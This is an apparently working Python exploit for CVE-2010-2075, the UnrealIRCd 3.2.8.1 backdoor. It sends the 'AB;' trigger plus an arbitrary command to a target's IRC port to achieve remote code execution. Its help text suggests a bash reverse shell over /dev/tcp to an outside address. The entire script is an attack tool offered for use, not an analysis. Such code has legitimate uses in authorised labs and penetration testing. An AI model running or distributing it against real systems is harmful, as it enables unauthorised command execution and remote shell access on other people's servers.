# CVE: 2010-2075
# Backdoor in UnrealIRCd 3.2.8.1
# Exploit Author: FredBrave

import socket, optparse, sys, signal

#Global Variables
BACKDOOR_PREFIX = 'AB;'



#Functions
def Exiting(sig, frame):
    print("\nExiting the exploit...")
    sys.exit(1)

#CTLR + C
signal.signal(signal.SIGINT,Exiting)

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option('-t', '--target', dest='Target', help='Target IP')
    parser.add_option('-p', '--port', dest='port', help='Open Port with IRCD', type=int)
    parser.add_option('-c', '--cmd', dest='cmd', help='Comman to execute')
    (options, arguments) = parser.parse_args()
    if not options.Target:
        parser.error("[-] Please indicate the Target IP -t, for more information... --help")
    if not options.port:
        parser.error("[-] Please indicate the port -p, for more information... --help")
    if not options.cmd:
        parser.error("[-] Please indicate the command to execute -c. Example: --cmd 'bash -i >& /dev/tcp/10.10.10.10/443 0>&1', for more information... --help")
    return options

def RCExplotation(Target,port,cmd):
    print('Creating connection')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print('Creating payload')
    payload = '{} {}'.format(BACKDOOR_PREFIX, cmd)
    s.connect((Target,port))
    rce = s.recv(1024).decode()
    print('[*]Sending Payload...')
    s.send(payload.encode())
    rce = s.recv(1024).decode()

def main():
    options = get_arguments()
    RCExplotation(options.Target, options.port, options.cmd)

if __name__ == '__main__':
    main()
    
